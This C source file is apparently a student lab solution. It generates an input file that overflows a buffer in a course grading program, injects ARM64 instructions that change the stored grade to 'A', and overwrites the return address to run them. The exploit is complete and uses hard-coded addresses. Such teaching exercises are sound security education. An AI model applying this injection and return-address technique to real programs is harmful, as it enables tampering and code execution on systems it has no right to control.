
/*
   createdataA.c
   Ben Zhou and Owen Clarke
*/

/*
   Produces a file called dataA with the student names Ben Zhou and
   Owen Clarke, null bytes for padding, instructions to overwrite the
   grade to an A and link back to the printf, additional null byte
   padding, and an overwritten return address to execute our injected
   instructions.
*/

#include <stdio.h>
#include "miniassembler.h"
#include <string.h>

/*
   main does not accept any command-line arguments or read from stdin,
   but writes to dataA as described in the file comment above
*/
int main(void)
{
    FILE *f;
    unsigned long pc;
    unsigned int instr;
    int i;

    /* Memory addresses found in the grader’s memory map */
    const unsigned long NAME_ADDR = 0x420058UL;
    const unsigned long GRADE_ADDR = 0x420044UL;
    const unsigned long PRINT_ADDR = 0x40089cUL;
    unsigned long returnAddr = 0x420058UL + 28;

    f = fopen("dataA", "w");

    /* Student names: 24 bytes */
    fprintf(f, "%s", "Ben Zhou and Owen Clarke");

    /* Null bytes for terminating string and padding */
    for (i = 0; i < 4; i++)
    {
        fprintf(f, "%c", '\0');
    }

    /* Counter starts after 24 name bytes and 4 null bytes */
    pc = NAME_ADDR + 28;

    /* x0 <- &grade */
    instr = MiniAssembler_adr(0, GRADE_ADDR, pc);
    fwrite(&instr, 4, 1, f);
    pc += 4;

    /* w1 <- 'A' */
    instr = MiniAssembler_mov(1, (int)'A');
    fwrite(&instr, 4, 1, f);
    pc += 4;

    /* *(&grade) = 'A' */
    instr = MiniAssembler_strb(1, 0);
    fwrite(&instr, 4, 1, f);
    pc += 4;

    /* jump into grader’s printf */
    instr = MiniAssembler_b(PRINT_ADDR, pc);
    fwrite(&instr, 4, 1, f);
    pc += 4;

    /* More padding to fill up 48 bytes of buffer */
    for (i = 0; i < 4; i++)
    {
        fprintf(f, "%c", '\0');
    }

    /* Overwritten return address to execute our injected
    instructions */
    fwrite(&returnAddr, sizeof(PRINT_ADDR), 1, f);

    fclose(f);
    return 0;
}